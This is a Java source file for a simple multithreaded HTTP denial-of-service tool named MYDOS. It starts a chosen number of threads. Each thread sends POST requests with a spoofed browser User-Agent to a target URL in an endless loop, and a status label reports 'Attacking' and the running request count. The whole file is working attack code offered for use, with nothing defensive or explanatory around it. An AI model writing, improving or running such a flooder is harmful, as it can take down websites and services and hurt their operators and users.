/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package intial;

import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.logging.Level;
import java.util.logging.Logger;
import javax.swing.JLabel;

/**
 *
 * @author K4K
 */
public class MYDOS {

    /**
     * @param args the command line arguments
     */
    public static String request = "";
    public static int theThreads;
    public static DdosThread thread;
    public static Boolean shouldStop = false;
    public static HttpURLConnection connection;
    private static javax.swing.JLabel status;
    public static int count = 0;
    public void beginAttack(JLabel status){
        int i = 0;
        for (i = 0; i < theThreads; i++) {
            try {
                    this.status = status;
                   thread = new DdosThread();
            } catch (Exception ex) {
                Logger.getLogger(MYDOS.class.getName()).log(Level.SEVERE, null, ex);
            }
            thread.start();
        }
    } 
    public void setIpAddress(String requestIn,String threadsIn){
        this.request = requestIn;
        this.theThreads = Integer.parseInt(threadsIn);
    }
    public static class DdosThread extends Thread {
 
        private AtomicBoolean running = new AtomicBoolean(true);
        private final URL url;
 
        String param = null;
 
        public DdosThread() throws Exception {
            url = new URL(request);
            param = "param1=" + URLEncoder.encode("87845", "UTF-8");
        } 
 
        @Override 
        public void run() { 
            while (running.get()) {
                try { 
                        startDOS();
                } catch (Exception e) {
                } 
            } 
        } 
 
        public void startDOS() throws Exception {
            connection = (HttpURLConnection) url.openConnection();
            connection.setDoOutput(true);
            connection.setDoInput(true);
            connection.setRequestMethod("POST");
            connection.setRequestProperty("charset", "utf-8");
            connection.setRequestProperty("Host", "localhost");
            connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:8.0) Gecko/20100101 Firefox/8.0");
            connection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
            connection.setRequestProperty("Content-Length", param);
                count +=1;
                String currently;
                if(connection.getResponseCode() == 200){
                    currently = "Attacking";
                }else{
                    currently = "Not Attacking";
                }
                status.setText(currently+" Response Message:" + connection.getResponseMessage()+" Number Of Requests Sent: "+count);
            connection.getInputStream();
        }
       
    }
}
    

